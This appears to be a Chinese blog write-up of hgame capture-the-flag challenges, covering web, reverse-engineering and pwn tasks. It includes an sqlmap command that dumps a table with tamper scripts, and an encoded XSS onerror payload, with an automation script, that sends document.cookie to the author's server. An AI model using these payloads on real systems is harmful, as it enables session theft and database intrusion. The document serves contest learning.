<pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;139.199.182.61&#x2F;index.php?id&#x3D;1 --tamper&#x3D;randomcase.py,space2comment.py -D easysql -T f1aggggggggggggg -dump-all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>flag就出来了</p>
<hr>
<h3 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h3><p>根据页面内容，可知读取了mycode这个文件的内容作为eval的参数，那么先去看看能不能访问mycode这个文件，<a href="http://2482d2a5eb.php.hgame.n3ko.co/mycode">http://2482d2a5eb.php.hgame.n3ko.co/mycode</a>发现可以看到文件内容：</p>
<p><img src="/images/1966f4b8/web-3-2.png" alt="2"></p>
<p>那么只要解密出这个token，拿这个token去访问url <code>http://2482d2a5eb.php.hgame.n3ko.co/</code>就得了，但是这个mycode的加密的方式会变化，学长还说每隔5秒变一次，那就要写脚本了，而且这个加密方式无非就<code>base64_encode</code>，<code>strrev</code>，<code>encrypt</code>，<code>str_rot13</code>这四种，比较好写，我的脚本如下：</p>
<pre class="line-numbers language-python2" data-language="python2"><code class="language-python2">#!&#x2F;bin&#x2F;python2
#coding&#x3D;utf8

import base64
import re
from requests import Session
from lxml import etree

def rot13(s):
    ret &#x3D; b&#39;&#39;
    for ch in  s:
        if ch &gt;&#x3D; &#39;a&#39; and ch &lt;&#x3D; &#39;z&#39;:
            c &#x3D; chr((ord(ch) - ord(&#39;a&#39;) + 13) % 26 + ord(&#39;a&#39;)) 
        elif ch &gt;&#x3D; &#39;A&#39; and ch &lt;&#x3D; &#39;Z&#39;:
            c &#x3D; chr((ord(ch) - ord(&#39;A&#39;) + 13) % 26 + ord(&#39;A&#39;))
        else:
            c &#x3D; ch
        ret +&#x3D; c
    return ret

def decrypt(s):
    ret &#x3D; &#39;&#39;
    for ch in s:
        c &#x3D; chr(ord(ch) - 1)
        ret +&#x3D; c
    return ret

def strrev(s):
    return s[::-1]

def base64_decode(s):
    return base64.b64decode(s)

def get_encrypt_token(s):
    url &#x3D; &#39;http:&#x2F;&#x2F;2482d2a5eb.php.hgame.n3ko.co&#x2F;&#39;
    r &#x3D; s.get(url)
    html &#x3D; etree.HTML(r.text)
    path &#x3D; &#39;&#x2F;html&#x2F;body&#x2F;text()&#39;
    return html.xpath(path)[0].strip(&#39;\n&#39;)

def get_encrypt_methods(s):
    url &#x3D; &#39;http:&#x2F;&#x2F;2482d2a5eb.php.hgame.n3ko.co&#x2F;mycode&#39;
    r &#x3D; s.get(url)
    text &#x3D; r.text
    #print text
    p &#x3D; r&#39;echo\((.*)\(\$_SERVER&#39;
    return re.search(p, r.text).group(1).split(&#39;(&#39;)

def decrypt_token(encrypt_token, methods):
    token &#x3D; encrypt_token
    for m in methods:
        if m &#x3D;&#x3D; &#39;str_rot13&#39;:
            token &#x3D; rot13(token)
        elif m &#x3D;&#x3D; &#39;strrev&#39;:
            token &#x3D; strrev(token)
        elif m &#x3D;&#x3D; &#39;base64_encode&#39;:
            token &#x3D; base64_decode(token)
        elif m &#x3D;&#x3D; &#39;encrypt&#39;:
            token &#x3D; decrypt(token)
        else:
            return None
    return token

def submit(s, token):
    url &#x3D; &#39;http:&#x2F;&#x2F;2482d2a5eb.php.hgame.n3ko.co&#x2F;&#39;
    data&#x3D;&#123;
        &#39;token&#39;: token
    &#125;
    r &#x3D; s.post(url, data&#x3D;data)

    return r.text


s &#x3D; Session()
encrypt_token &#x3D; get_encrypt_token(s)
methods &#x3D; get_encrypt_methods(s)

#print &#39;encrypt_token&#x3D;&#39;+encrypt_token
#print &#39;methods&#x3D;&#39;+str(methods)

token &#x3D; decrypt_token(encrypt_token, methods)

#print &#39;token&#x3D;&#39;+token

flag &#x3D; submit(s, token)

print flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h3><p>其实就是xss，不过有些防护，不断测试（省略无数次失败），发现<code>&lt;xxx&gt;</code>这样的会被过滤掉，<code>&lt;xxx</code>到不会被过滤掉，也就是只要尖括号成对出现都会被过滤掉，之前学到浏览器有容错性什么的，那就试试<code>&lt;xxx &lt;!--</code>。</p>
<p>后面的<code>&lt;!--</code>把后面的内容都注释掉，前面的<code>&lt;xxx</code>很可能被解析成<code>&lt;xxx&gt;</code>标签，于是尝试</p>
<p><code>&lt;img src=1 onerror=alert(1) &lt;!--</code></p>
<p>经过过滤后变成：</p>
<p><img src="/images/1966f4b8/web-4-8.png" alt="8"></p>
<p>发现全部转成大写了，alert变成了ALERT，那不行，那把onerror的内容全部编码成HTML实体编码：</p>
<p><code>&lt;img src=1 onerror=&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29; &lt;!--</code></p>
<p>在浏览器里试，发现成功弹窗了，那想办法，让其获取<code>http://c-chat.hgame.babelfish.ink/flag</code>的内容，通过url跳转到我的一个域名上，传参数为内容如<code>window.location=&#39;http://xxx/?flag=content&#39;</code>，这样查看我的服务器的日志就可以看到这个content了，还有那个验证码爆破一些数，md5前6位符合就行。</p>
<p>但是试了很多遍都不行，本地成功了。问过学长，原来是那个机器人不能访问``<a href="http://c-chat.hgame.babelfish.ink/flag`这个链接。。。">http://c-chat.hgame.babelfish.ink/flag`这个链接。。。</a></p>
<p>然后我就直接把cookie给窃取过来，然后我自己访问吧</p>
<p>onerror对应的js代码如下：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> img <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    img<span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'http://我的域名/?token='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>记得编码成HTML实体编码。</p>
<p>顺便写成脚本一步到位：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> requests


<span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">get_code</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 获取验证码前6位md5值</span>
    url <span class="token operator">=</span> <span class="token string">'http://c-chat.hgame.babelfish.ink/code'</span>
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>

    code <span class="token operator">=</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span>

    <span class="token comment"># 之前测试过，破解出来的都是8位数，所以这里直接从8位数开始</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">,</span> <span class="token number">99999999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">'http://c-chat.hgame.babelfish.ink/send'</span>
    payload <span class="token operator">=</span> <span class="token string">'&lt;img src=1 onerror=编码后的js代码'</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'message'</span><span class="token punctuation">:</span>payload
    <span class="token punctuation">&#125;</span>
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> r<span class="token punctuation">.</span>text

<span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">'http://c-chat.hgame.babelfish.ink/submit'</span>
    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'code'</span><span class="token punctuation">:</span>code
    <span class="token punctuation">&#125;</span>
    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> r


url <span class="token operator">=</span> <span class="token string">'http://c-chat.hgame.babelfish.ink'</span>


s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 访问一下url得到cookie</span>
r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>

<span class="token comment"># 获取验证码</span>
code <span class="token operator">=</span> get_code<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'code='</span><span class="token operator">+</span>code<span class="token punctuation">)</span>

<span class="token comment"># 发送构造好的payload</span>
text <span class="token operator">=</span> send<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
<span class="token comment"># print(text)</span>

<span class="token comment"># 提交验证码，让刚刚的payload生效</span>
r <span class="token operator">=</span> submit<span class="token punctuation">(</span>s<span class="token punctuation">,</span> code<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>记得把对应的payload换成自己的，然后查看服务器日志得到cookie</p>
<p><img src="/images/1966f4b8/web-4-9.png" alt="9"></p>
<p>然后<img src="/images/1966f4b8/web-4-7.png" alt="7">)带上cookie访问<a href="http://c-chat.hgame.babelfish.ink/flag">http://c-chat.hgame.babelfish.ink/flag</a>即可</p>
<hr>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="unpack"><a href="#unpack" class="headerlink" title="unpack"></a>unpack</h3><p>学长给的学习资料直接就跟着脱壳，脱完壳后很简单了，关键逻辑就这样：</p>
<p><img src="/images/1966f4b8/re-1-1.png" alt="1"></p>
<p><code>byte_6CA0A0</code>这个数组也知道了</p>
<p><img src="/images/1966f4b8/re-1-2.png" alt="2"></p>
<p>直接解就好</p>
<hr>
<h3 id="Classic-CrackMe"><a href="#Classic-CrackMe" class="headerlink" title="Classic_CrackMe"></a>Classic_CrackMe</h3><p>这个程序是C# .net写的，IDA看汇编很复杂的样子，后发现有反编译的软件，找一个来反编译，然后找到关键代码</p>
<p><img src="/images/1966f4b8/re-2-1.png" alt="1"></p>
<p>flag的形式就是，<code>hgame&#123;</code>+base64iv+str+<code>&#125;</code>，这个base64iv其实就是AES的初始向量，查过初始向量的作用就是加密前（解密类似）先和明文做一个异或操作，大概如下：</p>
<pre class="line-numbers language-none"><code class="language-none">明文 xor iv --key--&gt; 密文<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>那么可以看到上面第一个红框，通过不同的初始向量，同样的密钥，解密出来的结果是不一样的</p>
<pre class="line-numbers language-none"><code class="language-none">&#39;Learn principles&#39; xor iv1 --key--&gt; 密文
&#39;Same_ciphertext_&#39; xor iv2 --key--&gt; 密文<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>第一行的明文是根据上面的aes2来解密出来的，现在已知<code>&#39;Learn principles&#39;</code>，iv1和<code>&#39;Same_ciphertext_&#39;</code>，很容易确定通过异或可以得到iv2也就是我们的base64iv，即：</p>
<pre class="line-numbers language-none"><code class="language-none">&#39;Learn principles&#39; xor &#39;Same_ciphertext_&#39; xor iv1 &#x3D;&#x3D; iv2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>同样那个str也很好算，AES加密是分组加密的（这里是CBC模式），128bit一组，上一组加密的结果作为下一组加密的向量，而且text2刚好是一个分组，str刚好是第二个分组，知道text2也就知道用于与str异或的向量了，那直接在源码上动手解<img src="/images/1966f4b8/re-2-2.png" alt="2"></p>
<p>可以得到base64iv和str，从而得到flag</p>
<hr>
<h3 id="babyPy"><a href="#babyPy" class="headerlink" title="babyPy"></a>babyPy</h3><p>学点python字节码的东西，勉强还原python代码如下：</p>
<pre class="line-numbers language-none"><code class="language-none">def encrypt(flag):
    O0O &#x3D; OOo[0:0:-1]

    O0o &#x3D; list(O0O)

    for O0 in range(1, len(O0o)):
        Oo &#x3D; O0o[O0] ^ O0o[O0 - 1] 
        O0o[O0] &#x3D; Oo
    return hex(bytes(O0o))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>就是先反转，然后每一个数与前一个数异或，解密exp如下：</p>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;python2
#coding&#x3D;utf8


encrypt_data &#x3D; &#39;7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22&#39;

def decrypt(data):
    lst &#x3D; list(encrypt_data.decode(&#39;hex&#39;))


    for i in range(len(lst)-1, 0, -1):
        ch &#x3D; chr(ord(lst[i]) ^ ord(lst[i-1]))
        lst[i] &#x3D; ch


    s &#x3D; &#39;&#39;.join(lst)[::-1]
    return s
    

flag &#x3D; decrypt(encrypt_data)
print(flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="babyPyc"><a href="#babyPyc" class="headerlink" title="babyPyc"></a>babyPyc</h3><p>死磕python字节码，注意点：要用对应版本的python</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> marshal<span class="token punctuation">,</span>dis
<span class="token operator">>></span><span class="token operator">></span> f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'c.pyc'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># python3.7版本的pyc文件头有变化，变成16个字节了</span>
<span class="token string">b'B\r\r\n\x00\x00\x00\x00\xdaR%^ \x04\x00\x00'</span>
<span class="token operator">>></span><span class="token operator">></span> code <span class="token operator">=</span> marshal<span class="token punctuation">.</span>load<span class="token punctuation">(</span>f<span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> dis<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>code<span class="token punctuation">)</span>
  <span class="token number">3</span>           <span class="token number">0</span> JUMP_ABSOLUTE            <span class="token number">2</span>
        <span class="token operator">>></span>    <span class="token number">2</span> LOAD_CONST               <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
              <span class="token number">4</span> LOAD_CONST               <span class="token number">1</span> <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span>
              <span class="token number">6</span> IMPORT_NAME              <span class="token number">0</span> <span class="token punctuation">(</span>os<span class="token punctuation">)</span>
              <span class="token number">8</span> STORE_NAME               <span class="token number">0</span> <span class="token punctuation">(</span>os<span class="token punctuation">)</span>
             <span class="token number">10</span> LOAD_CONST               <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
             <span class="token number">12</span> LOAD_CONST               <span class="token number">1</span> <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span>
             <span class="token number">14</span> IMPORT_NAME              <span class="token number">1</span> <span class="token punctuation">(</span>sys<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>根据dis.dis(code)出来的类似汇编的代码，还原出源码大概是这样的：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token punctuation">,</span>sys
<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode

O0o <span class="token operator">=</span> <span class="token string">b'/KDq6pvN/LLq6tzM/KXq59Oh/MTqxtOTxdrqs8OoR3V1X09J'</span>

<span class="token keyword">def</span> <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> O0o
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Give me the flag'</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    O0o <span class="token operator">=</span> <span class="token string">b'Qo/Zg7N+WpXClNKYcanKfrO8n3qpqICtzrecpF2pZ3JvRS1Q'</span>
    <span class="token keyword">return</span> flag

flag <span class="token operator">=</span> getFlag<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">b'hgame&#123;'</span> <span class="token keyword">or</span> flag<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">125</span><span class="token punctuation">:</span> <span class="token comment"># 125 ord('&#125;')</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Incorrect format!'</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

raw_flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># hgame&#123;xx&#125;中的xx</span>

<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">7</span> <span class="token operator">!=</span> <span class="token number">36</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Wrong length!'</span><span class="token punctuation">)</span>
    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

raw_flag <span class="token operator">=</span> raw_flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token comment"># 反转</span>

ciphers <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token punctuation">[</span> raw_flag<span class="token punctuation">[</span>row<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span>col<span class="token punctuation">]</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">]</span> <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token comment">#print(ciphers)</span>

<span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        ciphers<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">+=</span> ciphers<span class="token punctuation">[</span>row<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span>
        ciphers<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">%=</span> <span class="token number">256</span>

<span class="token comment">#print(ciphers)</span>

s <span class="token operator">=</span> <span class="token string">b''</span>
<span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    col <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">while</span> col <span class="token operator">&lt;</span> <span class="token number">6</span><span class="token punctuation">:</span> 
        s <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span> ciphers<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">)</span>
        col <span class="token operator">+=</span> <span class="token number">1</span>

ciphers <span class="token operator">=</span> s

ciphers <span class="token operator">=</span> b64encode<span class="token punctuation">(</span>ciphers<span class="token punctuation">)</span>
<span class="token keyword">if</span> ciphers <span class="token operator">==</span> O0o<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Great, this is my flag.'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Wrong flag.'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，每一行的值都加上了下一行（并且对256取模），最后一行肯定是没有变的，可以倒推前面几行。按照这个思路，写出解密脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/bin/python3</span>

<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode

enc_data <span class="token operator">=</span> <span class="token string">b'Qo/Zg7N+WpXClNKYcanKfrO8n3qpqICtzrecpF2pZ3JvRS1Q'</span>
data <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>enc_data<span class="token punctuation">)</span>

c <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token punctuation">[</span> data<span class="token punctuation">[</span>row<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span>col<span class="token punctuation">]</span> <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">]</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        c<span class="token punctuation">[</span>row<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>c<span class="token punctuation">[</span>row<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">256</span> <span class="token operator">-</span> c<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>

<span class="token comment"># 转置</span>
c <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token punctuation">[</span> c<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">]</span> <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

s <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">)</span>

s <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hgame&#123;%s&#125;'</span> <span class="token operator">%</span> s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="findyourself"><a href="#findyourself" class="headerlink" title="findyourself"></a>findyourself</h3><p>（据说是辣个男人出的题，太难了）</p>
<p>首先是让你执行一条命令，然后让你猜当前目录位置，猜对了后面还有一次执行命令的机会，首先当然是想执行<code>cat flag</code>或者<code>pwd</code>啦，可惜不行，有检查</p>
<p><img src="/images/1966f4b8/pwn-1-3.png" alt="3"></p>
<p>那么当务之急当然是想办法获取当前目录位置啦，不能有pwd等单词，而且命令只能有数字字母和<code>-</code>，依稀记得linux有个文件系统对应内存区域，被挂载在<code>/proc</code>，赶紧去查下<code>/proc</code>下都有什么，发现<code>/proc/self/cwd</code>是当前目录的一个连接(link)，那么执行命令<code>ls -l /proc/self/cwd</code>即可看到连接到哪里了，也就是当前目录是哪。</p>
<p>然后还有一次执行命令的机会，限制如下：</p>
<p><img src="/images/1966f4b8/pwn-1-4.png" alt="4"></p>
<p><img src="/images/1966f4b8/pwn-1-5.png" alt="5"></p>
